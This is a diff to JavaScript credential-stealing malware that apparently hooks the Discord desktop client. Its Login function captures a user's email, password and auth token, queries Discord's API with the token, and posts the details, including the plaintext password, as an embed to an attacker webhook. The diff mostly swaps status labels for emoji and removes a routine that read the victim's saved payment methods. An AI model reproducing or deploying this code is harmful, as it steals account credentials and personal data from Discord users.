@@ -85,15 +85,15 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "no nitro"
+		return "❌"
 	}
 	if (flags == 1) {
-		return "nitro classic"
+		return "✔️ nitro classic"
 	}
 	if (flags == 2) {
-		return "nitro boost"
+		return "✔️ nitro boost"
 	} else {
-		return "no nitro"
+		return "❌"
 	}
 }
 
@@ -107,28 +107,28 @@ function GetRBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "discord staff "
+		badges += "✔️ discord staff "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "partnered server owner "
+		badges += "✔️ partnered server owner "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "hypesquad events "
+		badges += "✔️ hypesquad events "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "bug hunter tier 1 "
+		badges += "✔️ bug hunter tier 1 "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "early supporter "
+		badges += "✔️ early supporter "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "bug hunter tier 2 "
+		badges += "✔️ bug hunter tier 2 "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "verified bot developer "
+		badges += "✔️ verified bot developer "
 	}
 	if (badges == "") {
-		badges = ""
+		badges = "❌"
 	}
 	return badges
 }
@@ -146,66 +146,40 @@ function GetBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "discord staff "
+		badges += "✔️ discord staff "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "partnered server owner "
+		badges += "✔️ partnered server owner "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "hypesquad events "
+		badges += "✔️ hypesquad events "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "bug hunter tier 1 "
+		badges += "✔️ bug hunter tier 1 "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "early supporter "
+		badges += "✔️ early supporter "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "bug hunter tier 2 "
+		badges += "✔️ bug hunter tier 2 "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "verified bot developer "
+		badges += "✔️ verified bot developer "
 	}
 	if (badges == "") {
-		badges = "no badges"
+		badges = "❌"
 	}
 	return badges
 }
 
-function Cool() {
-	const json = JSON.parse(info3)
-	var billing = "";
-	json.forEach(z => {
-		if (z.type == "") {
-			return "no payment method"
-		} else if (z.type == 2 && z.invalid != !0) {
-			billing += "paypal"
-		} else if (z.type == 1 && z.invalid != !0) {
-			billing += "credit card"
-		} else {
-			return "no payment method"
-		}
-	})
-	if (billing == "") {
-		billing = "no payment method"
-	}
-	return billing
-}	
-
 function Login(email, password, token) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-	window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText`, !0).then((info3) => {		
         const json = JSON.parse(info);
         var params = {
             username: "stenko",
@@ -213,8 +187,8 @@ function Login(email, password, token) {
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
                 {
-                    "title": "user logged in",
-		    description: "᲼᲼᲼᲼",
+                    "title": "<:partner:909102089513340979> user logged in",
+		    "description": "᲼᲼᲼᲼",
                     "color": 3092790,
                     "fields": [
                         {
@@ -241,16 +215,6 @@ function Login(email, password, token) {
                             "name": " password",
                             "value": `\`${password}\``,
                             "inline": true		    
-                        },
-                        {
-                            "name": "᲼᲼᲼᲼",
-                            "value": `᲼᲼᲼᲼`,
-                            "inline": false
-                        }, 
-                        {
-                            "name": " payment method",
-                            "value": `\`${Cool()}\``,
-                            "inline": false
                         },
                         {
                             "name": "᲼᲼᲼᲼",
